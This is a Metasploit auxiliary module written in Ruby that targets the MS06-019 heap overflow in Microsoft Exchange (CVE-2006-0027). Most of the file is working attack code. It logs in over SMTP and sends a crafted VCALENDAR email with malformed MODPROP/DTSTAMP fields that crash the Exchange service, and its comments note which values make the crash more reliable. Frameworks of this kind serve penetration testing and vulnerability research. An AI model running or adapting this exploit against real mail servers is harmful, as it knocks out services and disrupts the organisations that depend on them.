##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Smtp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS06-019 Exchange MODPROP Heap Overflow',
        'Description' => %q{
          This module triggers a heap overflow vulnerability in MS
          Exchange that occurs when multiple malformed MODPROP values
          occur in a VCAL request.
        },
        'Author' => [ 'pusscat' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '17908'],
          [ 'CVE', '2006-0027'],
          [ 'MSB', 'MS06-019'],

        ],
        'DisclosureDate' => '2004-11-12',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SUBJECT', [ true, 'The subject of the e-mail', 're: Your Brains'])
      ]
    )
  end

  #
  # This needs some reworking to use the SMTPDeliver mixin and the Re::MIME class
  #
  def run
    connect_login

    modprops = [
      'attendee', 'categories', 'class', 'created', 'description',
      'dtstamp', 'duration', 'last-modified',
      'location', 'organizer', 'priority', 'recurrence-id', 'sequence',
      'status', 'summary', 'transp', 'uid'
    ]

    # modprops = ['dtstamp']

    modpropshort =	''
    modpropbusted =	''
    modnum = rand(3)

    1.upto(modnum) do
      nextprop = rand(modprops.size)
      modpropshort << modprops[nextprop] + ','
      modpropbusted << modprops[nextprop].upcase + ":\r\n"
    end

    modpropshort = 'dtstamp,'
    modpropbusted = "DTSTAMP:\r\n"
    modnum = modnum + 1 + rand(3)
    modproplong =	modpropshort
    1.upto(modnum) do
      modproplong << modprops[rand(modprops.size)] + ','
    end

    boundary = Rex::Text.rand_text_alphanumeric(8) + '.' + Rex::Text.rand_text_alphanumeric(8)

    # Really, the randomization above only crashes /sometimes/ - it's MUCH more
    # reliable, and gives crashes in better spots of you use these modprops:

    modpropshort = 'dtstamp,'
    modproplong = 'dtstamp, dtstamp,'
    modpropbusted = "DTSTAMP:\r\n"

    mail =	"From: #{datastore['MAILFROM']}\r\n"
    mail <<	"To: #{datastore['MAILTO']}\r\n"
    mail <<	"Subject: #{datastore['SUBJECT']}\r\n"
    mail <<	"Content-class: urn:content-classes:calendarmessage\r\n"
    mail <<	"MIME-Version: 1.0\r\n"
    mail <<	"Content-Type: multipart/alternative;boundary=\"#{boundary}\"\r\n"
    mail <<	"X-MimeOLE: Produced By Microsoft Exchange V6.5.7226.0\r\n"
    mail << "\r\n"
    mail <<	"--#{boundary}\r\n"
    mail <<	"Content-class: urn:content-classes:calendarmessage\r\n"
    mail <<	"Content-Type: text/calendar; method=REQUEST; name=\"meeting.ics\"\r\n"
    mail <<	"Content-Transfer-Encoding: 8bit\r\n"
    mail <<	"\r\n"
    mail <<	"BEGIN:VCALENDAR\r\n"
    mail <<	"BEGIN:VEVENT\r\n"
    mail <<	"X-MICROSOFT-CDO-MODPROPS:#{modpropshort.chop}\r\n"
    mail <<	modpropbusted
    mail <<	"END:VEVENT\r\n"
    mail <<	"BEGIN:VEVENT\r\n"
    mail <<	"X-MICROSOFT-CDO-MODPROPS:#{modproplong.chop}\r\n"
    mail <<	"END:VEVENT\r\n"
    mail <<	"END:VCALENDAR\r\n"
    mail <<	"\r\n--#{boundary}\r\n"
    mail <<	"\r\n.\r\n"

    print_status('Sending message...')
    sock.put(mail)
    sock.put("QUIT\r\n")
    print '<< ' + (sock.get_once || '')
    disconnect
  end
end
